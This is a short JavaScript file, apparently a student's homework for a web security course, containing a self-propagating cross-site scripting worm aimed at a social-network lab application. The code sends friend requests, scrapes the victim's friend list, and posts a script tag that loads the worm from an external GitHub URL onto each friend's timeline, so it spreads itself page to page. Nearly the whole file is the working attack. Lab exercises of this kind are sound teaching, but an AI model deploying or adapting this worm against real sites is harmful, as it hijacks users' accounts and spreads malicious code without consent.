//Peter Mastropaolo(pjm8331) CSEC-380 HW 6 Act 2

//Increase my Friends plz
$.get("add_friend.php", {'id': 78})

//Reposts the worm on other pages
$.get("friends.php", function(friends){
    listFriends = friends.split("?id=")
    //Iterates through Friend List
    for(var i = 1; i < listFriends.length; i++){
        //Sets the id of the friend
        id = listFriends[i].split("'>").toString().split(',')[0];

        $.get("timeline.php", {'id': 78}, function(timeline){
            //Reposts the script if it is not on their page
            if(!timeline.includes(id + "-Mr. Anderson... at time: ")){
                //Comments Identifier
                $.get("/add_comment.php", {'id': 78, 'comment': id + "-Mr. Anderson... at time: " + new Date(Date.now()).toLocaleString()})
                //Reposts the script
                $.get("/add_comment.php", {'id': id, 'comment': "<script src='https://raw.githubusercontent.com/pjm8331/WebApp/main/MrAnderson.js'></script>"})
            }
        })
    }
});
